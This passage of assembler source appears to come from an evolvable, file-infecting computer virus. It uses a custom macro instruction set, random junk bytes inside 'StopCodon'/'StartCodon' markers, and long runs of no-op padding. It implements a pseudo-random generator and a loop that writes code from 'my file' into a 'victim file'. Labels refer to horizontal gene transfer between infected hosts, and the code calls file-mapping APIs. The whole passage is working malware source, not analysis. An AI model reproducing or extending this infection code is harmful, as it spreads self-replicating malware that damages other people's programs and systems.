        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 136
db 156
db 54
db 108
db 69
db 3
db 123
db 244
db 46
db 47
db 116
db 9
db 35
db 185
db 168
db 125
db 30
db 92
db 203
db 192
db 127
db 250
db 190
db 252
db 13
db 186
db 8
db 49
db 222
db 135
db 254
db 253
db 218
db 120
db 49
db 115
db 197
db 220
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _saveWrtOff             ; BA1=RegC
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _pop
        _writeDWord             ; mov dword[RegC], BC1
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _getdata
db StopCodon
db 72
db 102
db 161
db 100
db 223
db 43
db 217
db 199
db 6
db 172
db 252
db 189
db 252
db 195
db 108
db 33
db 191
db 194
db 154
db 230
db 254
db 87
db 25
db 71
db 230
db 248
db 245
db 124
db 110
db 160
db 192
db 184
db 85
db 96
db 248
db 186
db 180
db 5
db 191
db 85
db 30
db 210
db 176
db 185
db 163
db 23
db 144
db 107
db 150
db 3
db 203
db 4
db 190
db 196
db 178
db 16
db 117
db 20
db 249
db 212
db 245
db 165
db 17
db 14
db 144
db 37
db 236
db 3
db 165
db 158
db 2
db 233
db 220
db 155
db StartCodon
               _div
               _nopsD
               _save
    _getDO
    BigNum=MapPointer-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 126
db 10
db 115
db 21
db 116
db 10
db 63
db 200
db 231
db 82
db 207
db 140
db 49
db 105
db 212
db 186
db 61
db 153
db 221
db 70
db 7
db 128
db 111
db 194
db 140
db 50
db 207
db 17
db 244
db 72
db 229
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _getdata
               _addsaved
               _push                ; Start in my file
db StopCodon
db 234
db 59
db 101
db 143
db 92
db 80
db 65
db 190
db 142
db 134
db 42
db 111
db 180
db 55
db StartCodon
    _getDO
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
db StopCodon
db 220
db 163
db 250
db 173
db 176
db 184
db 132
db 36
db 156
db 12
db 115
db 157
db 22
db 230
db 9
db 89
db 129
db 1
db 5
db 208
db 58
db 188
db 128
db 135
db 3
db 166
db 70
db 181
db 67
db 225
db StartCodon
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _saveWrtOff
        _getdata
        _nopdA                   ; eax=[RandomNumber]
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=1103515245
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
db StopCodon
db 132
db 141
db 171
db 214
db 30
db 101
db 139
db 59
db 135
db 28
db 101
db 16
db 86
db 103
db 44
db 210
db 103
db 9
db 67
db 63
db 203
db 45
db 204
db 33
db 150
db 140
db 161
db 128
db 46
db 117
db 12
db 188
db 196
db 85
db 220
db 149
db 0
db 65
db 19
db 225
db 170
db 197
db 65
db 117
db 156
db 101
db 162
db 79
db 228
db 176
db 225
db 212
db 250
db 186
db 97
db 99
db 164
db 204
db 44
db 215
db 113
db 216
db 117
db 43
db 110
db 180
db 2
db 58
db 21
db 237
db 104
db 81
db 62
db 130
db 181
db 244
db 112
db 104
db 158
db 110
db 181
db 151
db 85
db 47
db 164
db 123
db StartCodon
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _mul                     ; eax*=1103515245 % 2^32
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=12345
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
db StopCodon
db 236
db 121
db 80
db 214
db 171
db 95
db 6
db 120
db 50
db 115
db 98
db 136
db 245
db 161
db 90
db 51
db 120
db 246
db 38
db 205
db 190
db 80
db 79
db 34
db 172
db 82
db 144
db 155
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _save
        _nopsA
        _addsaved                ; eax+=12345 % 2^32
        _writeDWord              ; mov [RandomNumber], ebx
    _getDO
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
db StopCodon
db 25
db 87
db 104
db 58
db 207
db 135
db 205
db 211
db 61
db 188
db 105
db 244
db 249
db 56
db 174
db 214
db 227
db 186
db 1
db 241
db StartCodon
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 187
db 161
db 68
db 193
db 54
db StartCodon
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _getdata
db StopCodon
db 192
db 106
db 38
db 186
db 203
db 217
db 33
db 91
db 103
db 244
db 17
db 170
db 164
db 41
db 191
db 180
db 147
db 148
db 184
db 113
db StartCodon
               _nopdA
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
               _nopdD
    BigNum=11
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 101
db 59
db 161
db 226
db 115
db 228
db 156
db 89
db 91
db 181
db 68
db 11
db 75
db 12
db 211
db 220
db 7
db 89
db 205
db 207
db 64
db 92
db 19
db 32
db 20
db 38
db 203
db 10
db 99
db 11
db 207
db 120
db 49
db 72
db 176
db 44
db 13
db 80
db 128
db 4
db 177
db 65
db 174
db 80
db 86
db 121
db 27
db 193
db 219
db 113
db 69
db 68
db 19
db 229
db 31
db 156
db 60
db 52
db 236
db 96
db 68
db 84
db 160
db 111
db 199
db 78
db 52
db 145
db 247
db 156
db 92
db 104
db 79
db 13
db 150
db 200
db 103
db 81
db 252
db 238
db 163
db 158
db 195
db 66
db 91
db 178
db 95
db 73
db 126
db 132
db 147
db 241
db 248
db 230
db 29
db 96
db 250
db 128
db 174
db 123
db 77
db 240
db 9
db 154
db StartCodon
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
db StopCodon
db 91
db 110
db 218
db 105
db 33
db 255
db StartCodon
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 171
db 80
db 49
db 230
db StartCodon
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _div
               _nopsD
    BigNum=1
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
db StopCodon
db 192
db 4
db 232
db 167
db 90
db 31
db 242
db 136
db 32
db 42
db 183
db 91
db 94
db 157
db 121
db 221
db 200
db 207
db 113
db 72
db 144
db 44
db 241
db 110
db 65
db 138
db 15
db 156
db 80
db 108
db 143
db 121
db 40
db 159
db 160
db 123
db 29
db 132
db 190
db 157
db 228
db 176
db 147
db 11
db 187
db StartCodon
        _push                   ; save BC1
db StopCodon
db 216
db 193
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 62
db 50
db 245
db 16
db 175
db 56
db 206
db 132
db 42
db 18
db 188
db 142
db 60
db 74
db 147
db 190
db 59
db 150
db 221
db 190
db 161
db 82
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _nopdD
               ; Size in RegD
               _pop         ; Start in my file
               _nopdB
               _pop         ; Start in victim file
               _nopdA
               _pushall
               _getEIP
               _sub0001
               _sub0001
               _sub0001
               _sub0001
               _sub0001
               _saveJmpOff          ; Save everything, especially the old BA2
                       _nopsB
                       _saveWrtOff
    BigNum=1
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 115
db 28
db StartCodon
        _xor   ; BC1=0
        _add0001
db StopCodon
db 60
db 78
db 126
db 174
db 245
db 184
db 70
db 114
db 29
db 188
db 102
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
                       _nopdB
                       _nopsA
    BigNum=1
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
                       _nopdA
                       _sub0001
                       _getdata
db StopCodon
db 230
db 77
db 211
db 202
db 178
db 157
db 32
db 192
db 2
db 162
db 183
db StartCodon
                       _writeByte
                       _nopsD
db StopCodon
db 15
db 101
db 244
db 187
db 145
db 253
db 21
db 254
db 1
db 56
db 109
db 215
db 175
db 212
db 54
db 135
db 244
db 203
db 169
db 71
db 153
db 45
db 218
db 190
db 10
db 203
db 88
db 86
db 128
db 142
db 251
db 59
db 65
db StartCodon
                       _sub0001
                       _nopdD
               _JnzUp
               _popall              ; Get old BA2 again
    _getDO
    BigNum=HGTDidInsert-DataOffset
    AlreadyStarted=0
db StopCodon
db 117
db 249
db 171
db 116
db 9
db 148
db 28
db 41
db 242
db 139
db 8
db 93
db 176
db 91
db 88
db 87
db 161
db 108
db 56
db 186
db 30
db 129
db 174
db 181
db 64
db 21
db 24
db 4
db 102
db 18
db 170
db 50
db 21
db StartCodon
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 98
db 121
db 193
db 96
db 210
db 4
db 126
db 246
db 70
db 157
db 78
db 7
db 145
db 188
db 172
db 248
db 135
db 180
db 215
db 249
db 3
db 65
db 74
db 213
db StartCodon
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
               _writeDWord
               _push        ; trash
        HGTFileEnd1:
               _pop         ; from call
               _pop         ; saved address
    _getDO
    BigNum=HGTMapPointer-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _getdata
               _push
    _getDO
    BigNum=hUnmapViewOfFile-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
db StopCodon
db 38
db 52
db 176
db 98
db 108
db 47
db 232
db 237
db 142
db 3
db 67
db 218
db 201
db StartCodon
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
    _getdata
    _call
               _getDO
    BigNum=(hCloseHandle-DataOffset)
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 163
db 86
db 224
db 81
db 69
db 208
db 223
db 62
db 221
db 0
db 30
db 131
db 205
db 79
db 167
db 85
db 49
db 144
db 114
db 175
db 186
db 123
db 236
db 53
db 66
db 63
db 52
db 254
db 143
db 219
db 189
db 249
db 141
db 157
db 17
db 222
db 122
db 50
db 193
db 169
db 148
db 125
db 185
db 106
db 208
db 64
db 142
db 165
db 0
db 107
db 177
db 36
db 80
db 86
db 19
db 182
db 247
db 118
db 130
db 76
db 203
db 96
db 221
db 112
db 81
db 196
db 69
db 227
db 225
db 122
db 66
db 35
db 130
db 160
db 29
db 160
db 130
db 122
db 56
db 149
db 162
db 59
db 236
db 231
db 142
db 200
db StartCodon
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _getdata
               _nopdA       ; Save API in RegA
    _getDO
    BigNum=HGTMapHandle-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
